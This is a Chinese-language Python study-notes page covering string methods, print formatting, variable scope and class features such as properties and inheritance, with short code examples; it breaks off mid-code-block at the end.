<h2 id="复杂列表生成式"><a href="#复杂列表生成式" class="headerlink" title="复杂列表生成式"></a>复杂列表生成式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tds = [&apos;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&apos; % (name, score) for name, score in d.iteritems()]</span><br><span class="line">print &apos;&lt;table&gt;&apos;</span><br><span class="line">print &apos;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Score&lt;/th&gt;&lt;tr&gt;&apos;</span><br><span class="line">print &apos;\n&apos;.join(tds)</span><br><span class="line">print &apos;&lt;/table&gt;&apos;</span><br></pre></td></tr></table></figure>
<h2 id="max"><a href="#max" class="headerlink" title="max()"></a>max()</h2><p>返回集合或参数中的最大值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">list = [1,2,3,26]</span><br><span class="line">name = &apos;Andy&apos;</span><br><span class="line">max(list)</span><br><span class="line">//26</span><br><span class="line">max(name)</span><br><span class="line">//y</span><br></pre></td></tr></table></figure>
<h2 id="min"><a href="#min" class="headerlink" title="min()"></a>min()</h2><p>返回集合或参数中的最小值</p>
<h2 id="sum"><a href="#sum" class="headerlink" title="sum()"></a>sum()</h2><p>返回总和</p>
<h1 id="选择分支"><a href="#选择分支" class="headerlink" title="选择分支"></a>选择分支</h1><h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><p>python3里可以使用下列方式返回函数值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def is_prime(num):</span><br><span class="line">    for factor in range(2, num):</span><br><span class="line">        if num % factor == 0:</span><br><span class="line">            return False</span><br><span class="line">    return True if num != 1 else False</span><br></pre></td></tr></table></figure>
<h1 id="String"><a href="#String" class="headerlink" title="String"></a>String</h1><h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h2><h3 id="string-replace"><a href="#string-replace" class="headerlink" title="string.replace()"></a>string.replace()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string.replace(&apos;被替换&apos;,&apos;待替换&apos;)</span><br></pre></td></tr></table></figure>
<p>替换多个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string.replace(&apos;被替换&apos;,&apos;待替换&apos;).replace(&apos;被替换&apos;,&apos;待替换&apos;)</span><br></pre></td></tr></table></figure>
<h2 id="分割"><a href="#分割" class="headerlink" title="分割"></a>分割</h2><h3 id="split"><a href="#split" class="headerlink" title="split()"></a>split()</h3><p>将字符串分割成列表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">split(sep=None, maxsplit=-1)</span><br><span class="line">//sep是分割符，默认为空格</span><br><span class="line">//maxsplit是分割数量，默认为-1，即无限制</span><br></pre></td></tr></table></figure>
<h2 id="input"><a href="#input" class="headerlink" title="input()"></a>input()</h2><p>python3中没有<code>raw_input()</code><br>将<code>raw_input()</code>和<code>input()</code>整合为<code>input()</code></p>
<h2 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h2><h3 id="Ascii码"><a href="#Ascii码" class="headerlink" title="Ascii码"></a>Ascii码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ord(str)</span><br></pre></td></tr></table></figure>
<h3 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr(num)</span><br></pre></td></tr></table></figure>
<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><h3 id="strip"><a href="#strip" class="headerlink" title="strip()"></a>strip()</h3><p>删除字符串两边的指定字符，默认为空格</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string = &apos; chessur &apos;</span><br><span class="line">print(string.strip())</span><br><span class="line">//chessur</span><br></pre></td></tr></table></figure>
<h3 id="rstrip"><a href="#rstrip" class="headerlink" title="rstrip()"></a>rstrip()</h3><p>删除字符串最右边的指定字符，默认为空格</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string = &apos; chessur &apos;</span><br><span class="line">print(string.rstrip())</span><br><span class="line">// chessur</span><br></pre></td></tr></table></figure>
<h3 id="lstrip"><a href="#lstrip" class="headerlink" title="lstrip()"></a>lstrip()</h3><p>删除字符串最左边的指定字符，默认为空格</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string = &apos; chessur &apos;</span><br><span class="line">print(string.rstrip())</span><br><span class="line">//chessur</span><br></pre></td></tr></table></figure>
<h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><h3 id="find"><a href="#find" class="headerlink" title="find()"></a>find()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string = &apos;chessur&apos;</span><br><span class="line">print(string.find(&apos;ss&apos;))</span><br><span class="line">//3</span><br><span class="line">print(string.find(&apos;life&apos;))</span><br><span class="line">//-1</span><br></pre></td></tr></table></figure>
<h3 id="index-1"><a href="#index-1" class="headerlink" title="index()"></a>index()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string = &apos;chessur&apos;</span><br><span class="line">print(string.index(&apos;ss&apos;))</span><br><span class="line">//3</span><br><span class="line">print(string.index(&apos;life&apos;))</span><br><span class="line">//报错</span><br></pre></td></tr></table></figure>
<p>index()为找到匹配项时，会报错，报错内容是<code>substring not found</code></p>
<h2 id="更改字符"><a href="#更改字符" class="headerlink" title="更改字符"></a>更改字符</h2><h3 id="capitalize"><a href="#capitalize" class="headerlink" title="capitalize()"></a>capitalize()</h3><p>首字母大写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string = &apos;chessur&apos;</span><br><span class="line">print(string.capitalize())</span><br><span class="line">&apos;Chessur&apos;</span><br></pre></td></tr></table></figure>
<h3 id="upper"><a href="#upper" class="headerlink" title="upper()"></a>upper()</h3><p>字符全部大写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string = &apos;chessur&apos;</span><br><span class="line">print(string.upper())</span><br><span class="line">//CHESSUR</span><br></pre></td></tr></table></figure>
<h3 id="lower"><a href="#lower" class="headerlink" title="lower()"></a>lower()</h3><p>字符全部小写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string = &apos;Chessur&apos;</span><br><span class="line">print(string.lower())</span><br><span class="line">//chessur</span><br></pre></td></tr></table></figure>
<h3 id="center"><a href="#center" class="headerlink" title="center()"></a>center()</h3><p>将字符串以指定的宽度居中，并用指定的字符填充两侧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string = &apos;chessur&apos;</span><br><span class="line">print(string.center(26,&apos;~&apos;))</span><br><span class="line">//~~~~~~~~~chessur~~~~~~~~~~</span><br></pre></td></tr></table></figure>
<h3 id="ljust"><a href="#ljust" class="headerlink" title="ljust()"></a>ljust()</h3><p>将字符串以指定的宽度靠左，并用指定的字符填充两侧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string = &apos;chessur&apos;</span><br><span class="line">print(string.ljust(26,&apos;~&apos;))</span><br><span class="line">//chessur~~~~~~~~~~~~~~~~~~~</span><br></pre></td></tr></table></figure>
<h3 id="rjust"><a href="#rjust" class="headerlink" title="rjust()"></a>rjust()</h3><p>将字符串以指定的宽度靠右，并用指定的字符填充两侧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string = &apos;chessur&apos;</span><br><span class="line">print(string.rjust(26,&apos;~&apos;))</span><br><span class="line">//~~~~~~~~~~~~~~~~~~~chessur</span><br></pre></td></tr></table></figure>
<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><h3 id="startswith"><a href="#startswith" class="headerlink" title="startswith()"></a>startswith()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string = &apos;chessur&apos;</span><br><span class="line">print(string.startswith(&apos;che&apos;))</span><br><span class="line">//True</span><br><span class="line">print(string.startswith(&apos;ss&apos;))</span><br><span class="line">//False</span><br></pre></td></tr></table></figure>
<h3 id="endswith"><a href="#endswith" class="headerlink" title="endswith()"></a>endswith()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string = &apos;chessur&apos;</span><br><span class="line">print(string.endswith(&apos;sur&apos;))</span><br><span class="line">//True</span><br><span class="line">print(string.endswith(&apos;che&apos;))</span><br><span class="line">//False</span><br></pre></td></tr></table></figure>
<h3 id="isdigit"><a href="#isdigit" class="headerlink" title="isdigit()"></a>isdigit()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string = &apos;chessur&apos;</span><br><span class="line">print(string.isdigit())</span><br><span class="line">//False</span><br></pre></td></tr></table></figure>
<h3 id="isalpha"><a href="#isalpha" class="headerlink" title="isalpha()"></a>isalpha()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string = &apos;chessur&apos;</span><br><span class="line">print(string.isalpha())</span><br><span class="line">//True</span><br></pre></td></tr></table></figure>
<h3 id="isalnum"><a href="#isalnum" class="headerlink" title="isalnum()"></a>isalnum()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string = &apos;chessur&apos;</span><br><span class="line">print(string.isalnum())</span><br><span class="line">//True</span><br></pre></td></tr></table></figure>
<h2 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h2><h3 id="join"><a href="#join" class="headerlink" title="join()"></a>join()</h3><p>使用指定字符分割列表中元素，需要元素都是字符类型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list = [&apos;chessur&apos;,&apos;60&apos;,&apos;Druid&apos;]</span><br><span class="line">print(&apos;~&apos;.join(list))</span><br><span class="line">//chessur~60~Druid</span><br></pre></td></tr></table></figure>
<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="函数变量优先级"><a href="#函数变量优先级" class="headerlink" title="函数变量优先级"></a>函数变量优先级</h2><p>局部作用域&gt;嵌套作用域&gt;全局作用域&gt;内置作用域</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def chessur():</span><br><span class="line">	b = &apos;hello&apos;</span><br><span class="line">	def windy():</span><br><span class="line">		c = &apos;world&apos;</span><br><span class="line">		print(a)</span><br><span class="line">		print(b)</span><br><span class="line">		print(c)</span><br><span class="line">	windy()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	a = &apos;chessur&apos;</span><br><span class="line">	chessur()</span><br></pre></td></tr></table></figure>
<p>上面的例子里，变量<code>a</code>是全局作用域，变量<code>b</code>对于函数<code>chessur()</code>来说是局部作用域，对于函数<code>windy()</code>来说是嵌套作用域，内置作用域是Python自带的一些函数。</p>
<table>
<thead>
<tr>
<th style="text-align:center">中文名</th>
<th style="text-align:center">英文名</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">局部作用域</td>
<td style="text-align:center">Local</td>
</tr>
<tr>
<td style="text-align:center">嵌套作用域</td>
<td style="text-align:center">Enclosing</td>
</tr>
<tr>
<td style="text-align:center">全局作用域</td>
<td style="text-align:center">Global</td>
</tr>
<tr>
<td style="text-align:center">内置作用域</td>
<td style="text-align:center">Built-in</td>
</tr>
</tbody>
</table>
<p>可以使用<code>global</code>来让函数中的变量来自全局作用域，使用<code>nonlocal</code>来表示变量来自嵌套作用域</p>
<p>修改后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">def chessur():</span><br><span class="line">    b = &apos;hello&apos;</span><br><span class="line">    def windy():</span><br><span class="line">        nonlocal b </span><br><span class="line">        b = &apos;kindle&apos;</span><br><span class="line">        c = &apos;world&apos;</span><br><span class="line">        print(a)</span><br><span class="line">        print(b)</span><br><span class="line">        print(c)</span><br><span class="line">    windy()</span><br><span class="line">    print(b)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    a = &apos;chessur&apos;</span><br><span class="line">    chessur()</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">chessur</span><br><span class="line">kindle</span><br><span class="line">world</span><br><span class="line">kindle</span><br><span class="line">&apos;&apos;&apos;</span><br></pre></td></tr></table></figure>
<h2 id="print"><a href="#print" class="headerlink" title="print()"></a>print()</h2><h3 id="format"><a href="#format" class="headerlink" title="format()"></a>format()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">A = 1</span><br><span class="line">B = 2</span><br><span class="line"></span><br><span class="line">#位置参数</span><br><span class="line">print(&quot;A+B=&#123;&#125; A-B=&#123;&#125;&quot;.format(A+B,A-B))</span><br><span class="line">print(&quot;A+B=&#123;0&#125; A-B=&#123;1&#125;&quot;.format(A+B,A-B))</span><br><span class="line">#关键词参数</span><br><span class="line">print(&quot;A+B=&#123;a&#125; A-B=&#123;b&#125;&quot;.format(a = A+B,b = A-B))</span><br><span class="line">#位置参数必须在关键词参数前面</span><br><span class="line">#错误用法：SyntaxError: positional argument follows keyword argument</span><br><span class="line">print(&quot;A+B=&#123;a&#125; A-B=&#123;0&#125;&quot;.format(a = A+B,A-B))</span><br><span class="line">#正确用法：</span><br><span class="line">print(&quot;A+B=&#123;0&#125; A-B=&#123;a&#125;&quot;.format(A+B,a = A-B))</span><br></pre></td></tr></table></figure>
<h3 id="print-f"><a href="#print-f" class="headerlink" title="print(f)"></a>print(f)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(f&apos;计算0-9的平方分别为：&#123;result&#125;&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="格式化操作符"><a href="#格式化操作符" class="headerlink" title="格式化操作符"></a>格式化操作符</h3><table>
<thead>
<tr>
<th style="text-align:center"><strong>符号</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">%c</td>
<td>格式化字符及ASCII</td>
</tr>
<tr>
<td style="text-align:center">%s</td>
<td>格式化字符串</td>
</tr>
<tr>
<td style="text-align:center">%d</td>
<td>格式化整数</td>
</tr>
<tr>
<td style="text-align:center">%o</td>
<td>格式化无符号八进制</td>
</tr>
<tr>
<td style="text-align:center">%x</td>
<td>格式化无符号十六进制数</td>
</tr>
<tr>
<td style="text-align:center">%X</td>
<td>格式化无符号十六进制数(大写)</td>
</tr>
<tr>
<td style="text-align:center">%f</td>
<td>格式化浮点数字，可指定小数点后的精度</td>
</tr>
<tr>
<td style="text-align:center">%e</td>
<td>用科学计数法格式化浮点数</td>
</tr>
<tr>
<td style="text-align:center">%E</td>
<td>用科学计数法格式化浮点数(大写)</td>
</tr>
<tr>
<td style="text-align:center">%g</td>
<td>根据值的大小决定使用%f或%E</td>
</tr>
<tr>
<td style="text-align:center">%G</td>
<td>根据值的大小决定使用%f或%E(大写)</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;%c&apos; % 99</span><br><span class="line">&apos;%c%c%c%c%c%c%c&apos; % (99,104,101,115,115,117,114)</span><br></pre></td></tr></table></figure>
<h3 id="格式化操作符的辅助命令"><a href="#格式化操作符的辅助命令" class="headerlink" title="格式化操作符的辅助命令"></a>格式化操作符的辅助命令</h3><table>
<thead>
<tr>
<th style="text-align:center">符号</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">m.n</td>
<td style="text-align:center">m是最小总宽度，n是小数点后的位数</td>
</tr>
<tr>
<td style="text-align:center">-</td>
<td style="text-align:center">结果左对齐</td>
</tr>
<tr>
<td style="text-align:center">+</td>
<td style="text-align:center">在证书面前显示加号（+）</td>
</tr>
<tr>
<td style="text-align:center">#</td>
<td style="text-align:center">在八进制面前显示‘0o’，在十六进制数面前显示‘0x’,’0X’</td>
</tr>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">显示的数字前面填充‘0’代替空格</td>
</tr>
</tbody>
</table>
<h3 id="Python的转义字符及含义"><a href="#Python的转义字符及含义" class="headerlink" title="Python的转义字符及含义"></a>Python的转义字符及含义</h3><table>
<thead>
<tr>
<th style="text-align:center">符号</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\’</td>
<td style="text-align:center">单引号</td>
</tr>
<tr>
<td style="text-align:center">\”</td>
<td style="text-align:center">双引号</td>
</tr>
<tr>
<td style="text-align:center">\a</td>
<td style="text-align:center">发出系统响铃</td>
</tr>
<tr>
<td style="text-align:center">\b</td>
<td style="text-align:center">退格符</td>
</tr>
<tr>
<td style="text-align:center">\n</td>
<td style="text-align:center">换行符</td>
</tr>
<tr>
<td style="text-align:center">\t</td>
<td style="text-align:center">横向制表符（TAB）</td>
</tr>
<tr>
<td style="text-align:center">\v</td>
<td style="text-align:center">纵向制表符</td>
</tr>
<tr>
<td style="text-align:center">\r</td>
<td style="text-align:center">回车符</td>
</tr>
<tr>
<td style="text-align:center">\f</td>
<td style="text-align:center">换页符</td>
</tr>
<tr>
<td style="text-align:center">\o</td>
<td style="text-align:center">八进制数代表字符</td>
</tr>
<tr>
<td style="text-align:center">\x</td>
<td style="text-align:center">十六进制数代表字符</td>
</tr>
<tr>
<td style="text-align:center">\0</td>
<td style="text-align:center">代表一个空字符</td>
</tr>
<tr>
<td style="text-align:center">\\</td>
<td style="text-align:center">反斜杠</td>
</tr>
</tbody>
</table>
<p>print()函数默认结尾为<code>\n</code>，可以使用<code>end=&#39; &#39;</code>改变结尾</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(&apos;Hello&apos;,end=&apos; &apos;)</span><br><span class="line">print(&apos;World&apos;,end=&apos; &apos;)</span><br></pre></td></tr></table></figure>
<p>在字符串前添加<code>\r</code>，表示将输出的内容返回到第一个指针，可以实现倒计时的功能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    for i in range(10):</span><br><span class="line">        print(&apos;\r倒计时：%d&apos;%(9 - i),end = &apos;&apos;)</span><br><span class="line">        time.sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>类的方法第一个参数是`self</p>
<h3 id="init"><a href="#init" class="headerlink" title="__init__()"></a>__init__()</h3><p>用于在创建对象时进行初始化操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Druid(object):</span><br><span class="line">	#创建时，可以赋予name属性</span><br><span class="line">	def __init__(self,name):</span><br><span class="line">		self.name = name</span><br></pre></td></tr></table></figure>
<h3 id="del-1"><a href="#del-1" class="headerlink" title="__del__()"></a>__del__()</h3><p>在脚本结束时，销毁对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Druid(object):</span><br><span class="line">	def __del__(self):</span><br><span class="line">		print(&quot;销毁对象&quot;)</span><br></pre></td></tr></table></figure>
<h4 id="str"><a href="#str" class="headerlink" title="__str__()"></a>__str__()</h4><p>在调用类作为字符串时，使用该方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Druid(object):</span><br><span class="line">    def __str__(self):</span><br><span class="line">        return &apos;%s,%s,%s&apos; %(self._name,self._level,self._gender)</span><br></pre></td></tr></table></figure>
<h3 id="slots"><a href="#slots" class="headerlink" title="__slots__"></a>__slots__</h3><p>限定对象可以更改的属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class Druid(object):</span><br><span class="line">    __slots__ = (&apos;_name&apos;,&apos;_level&apos;,&apos;_gender&apos;)</span><br></pre></td></tr></table></figure>
<h2 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h2><h3 id="property"><a href="#property" class="headerlink" title="@property"></a>@property</h3><p>访问器 - getter 方法</p>
<h3 id="attribute-setter"><a href="#attribute-setter" class="headerlink" title="@attribute.setter"></a>@attribute.setter</h3><p>修改器 - setter 方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">class Druid(object):</span><br><span class="line"></span><br><span class="line">    __slots__ = (&apos;_name&apos;,&apos;_level&apos;,&apos;_gender&apos;)</span><br><span class="line">        </span><br><span class="line">    def __init__(self,name,level):</span><br><span class="line">        self._name = name</span><br><span class="line">        self._level = level </span><br><span class="line">        </span><br><span class="line">    @property</span><br><span class="line">    def name(self):</span><br><span class="line">        return self._name</span><br><span class="line">            </span><br><span class="line">    @property</span><br><span class="line">    def level(self):</span><br><span class="line">        return self._level</span><br><span class="line">    </span><br><span class="line">    @level.setter</span><br><span class="line">    def level(self,level):</span><br><span class="line">        self._level = level</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def fly(self):</span><br><span class="line">        if self._level &lt; 60:</span><br><span class="line">            print(&apos;%s不能飞行&apos; %self._name)</span><br><span class="line">        else :</span><br><span class="line">            print(&apos;%s可以飞行&apos; %self._name)</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">def main():</span><br><span class="line">    chessur = Druid(&apos;chessur&apos;,48)</span><br><span class="line">    chessur.fly()</span><br><span class="line">    chessur.level = 60</span><br><span class="line">    chessur.fly()</span><br><span class="line">    chessur._gender = &apos;male&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>装饰器相当于用一个函数去调用被装饰的函数</p>
<h3 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h3><h4 id="staticmethod"><a href="#staticmethod" class="headerlink" title="@staticmethod"></a>@staticmethod</h4><p>静态方法是属于类的方法，而不是对象的方法</p>
<h3 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h3><h4 id="classmethod"><a href="#classmethod" class="headerlink" title="@classmethod"></a>@classmethod</h4><p>类方法的第一个参数约定名为cls</p>
<h2 id="类之间的关系"><a href="#类之间的关系" class="headerlink" title="类之间的关系"></a>类之间的关系</h2><h3 id="is-a"><a href="#is-a" class="headerlink" title="is-a"></a>is-a</h3><p>继承或泛化</p>
<h3 id="has-a"><a href="#has-a" class="headerlink" title="has-a"></a>has-a</h3><p>关联，关联分为聚合关系和合成关系。聚合关系是整体和部分的关联，如果整体进一步负责了部分的生命周期(整体和部分是不可分割的，同时存在也同时消亡)，那么是合成关系</p>
<h3 id="use-a"><a href="#use-a" class="headerlink" title="use-a"></a>use-a</h3><p>依赖，类的方法调用了另一个类</p>
<h2 id="继承和多态"><a href="#继承和多态" class="headerlink" title="继承和多态"></a>继承和多态</h2><p>一个类从另一个类那里将方法和属性直接继承下来，提供继承信息的称为父类、超类或基类；得到继承信息的称为子类、派生类或衍生类。子类除了继承父类提供的属性和方法，还可以定义自己特有的属性和方法。</p>
<h3 id="super"><a href="#super" class="headerlink" title="super()"></a>super()</h3><p>可以继承父类的属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Feral(Druid):</span><br><span class="line">    def __init__(self,name,level,spell):</span><br><span class="line">        super().__init__(name,level)</span><br><span class="line">        self._spell = spell</span><br></pre></td></tr></table></figure>
<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 